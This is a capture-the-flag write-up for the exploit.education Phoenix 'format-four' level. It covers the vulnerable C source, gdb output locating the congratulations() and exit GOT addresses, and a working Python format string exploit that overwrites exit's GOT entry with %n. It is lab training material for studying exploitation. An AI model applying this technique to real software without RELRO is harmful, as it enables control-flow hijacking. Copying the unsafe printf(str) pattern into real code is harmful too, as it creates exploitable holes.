# FORMAT FOUR

## SOURCE CODE

```c
/*
 * phoenix/format-four, by https://exploit.education
 *
 * Can you affect code execution? Once you've got congratulations() to
 * execute, can you then execute your own shell code?
 *
 * Did you get a hair cut?
 * No, I got all of them cut.
 *
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

void bounce(char *str) {
  printf(str);
  exit(0);
}

void congratulations() {
  printf("Well done, you're redirected code execution!\n");
  exit(0);
}

int main(int argc, char **argv) {
  char buf[4096];

  printf("%s\n", BANNER);

  if (read(0, buf, sizeof(buf) - 1) <= 0) {
    exit(EXIT_FAILURE);
  }

  bounce(buf);
}
```

## STRATEGY
The goal is to take control of the program flow and perform the *`congratulations`* function, but this time we cannot use the return address as the bounce function executes an exit system call. However, we can use the exit, in fact, it is defined in the standard library and therefore its location is inserted by the dynamic linker in the GOT table (global offset table) and the address of the GOT entry with the exit is in the PLT table (procedures linkage table). Using a string format attack we can overwrite the entry in the GOT, so the exit will jump into the PLT then into the GOT and finally instead of the exit routine it will jump to the *`congratulations`* function. This time we will let python do the math.
**ATTENTION**: to mitigate these types of attacks there is RelRO (RELocation Read-Only) protection which makes the GOT read-only, in this case, it is disabled, therefore the attack will be successful.

## EXPLOIT

1. Retrive *`congratulations`* address with gdb:
```gdb
gef➤  disas congratulations 
Dump of assembler code for function congratulations:
   0x08048503 <+0>:	push   ebp
   0x08048504 <+1>:	mov    ebp,esp
   0x08048506 <+3>:	sub    esp,0x8
   0x08048509 <+6>:	sub    esp,0xc
   0x0804850c <+9>:	push   0x80485d0
   0x08048511 <+14>:	call   0x8048310 <puts@plt>
   0x08048516 <+19>:	add    esp,0x10
   0x08048519 <+22>:	sub    esp,0xc
   0x0804851c <+25>:	push   0x0
   0x0804851e <+27>:	call   0x8048330 <exit@plt>
End of assembler dump.

```
address: 0x08048503


2. Retrive exit address in the GOT with gdb:
```gdb
gef➤  disas bounce
Dump of assembler code for function bounce:
   0x080484e5 <+0>:	push   ebp
   0x080484e6 <+1>:	mov    ebp,esp
   0x080484e8 <+3>:	sub    esp,0x8
   0x080484eb <+6>:	sub    esp,0xc
   0x080484ee <+9>:	push   DWORD PTR [ebp+0x8]
   0x080484f1 <+12>:	call   0x8048300 <printf@plt>
   0x080484f6 <+17>:	add    esp,0x10
   0x080484f9 <+20>:	sub    esp,0xc
   0x080484fc <+23>:	push   0x0
   0x080484fe <+25>:	call   0x8048330 <exit@plt>
End of assembler dump.
gef➤  disas 0x8048330
Dump of assembler code for function exit@plt:
   0x08048330 <+0>:	jmp    DWORD PTR ds:0x80497e4
   0x08048336 <+6>:	push   0x18
   0x0804833b <+11>:	jmp    0x80482f0
End of assembler dump.
```
exit location in the GOT: 0x80497e4

If you want to see what's inside, you have to do that runtime, so set a breakpoint in, run, inspect the address:
```gdb
gef➤  x 0x80497e4
0x80497e4 <exit@got.plt>:	0xf7f7f543

```


3. Like in the previous challenge we need to know the buffer position in the stack at printf. We can do it inspecting the stack with %x and format string vulnerability:
```shell
user@phoenix-amd64:/opt/phoenix/i486$ python -c 'print "AAAA" + ".%08x"*15' | ./format-four 
Welcome to phoenix/format-four, brought to you by https://exploit.education
AAAA.00000000.00000000.00000000.f7f81cf7.f7ffb000.ffffd638.0804857d.ffffc630.ffffc630.00000fff.00000000.41414141.3830252e.30252e78.252e7838
```
Buffer is in the 12th position


4. Final python program:
```python
import struct

address_got = 0x80497e4

buffer = struct.pack("I", address_got)
buffer += "JUNK"
buffer += struct.pack("I", address_got + 2)
buffer += "%08x"*10 + "%" + str(0x8503 - len(buffer) - 80) + "x" + "%n"
buffer += "%" + str(0x10804 - 0x8503) +  "x" + "%n"
print buffer
```

**EXPLANATION**: before printing the buffer we print 10 argument with *`%08x`*. This give us 10 argument, each with 8 characters/numbers, so we can calculate how many extra bytes subtract. 10 (argument) x 8 (bytes) = 80 ----> str(0x8503 - len(buffer) - 80).
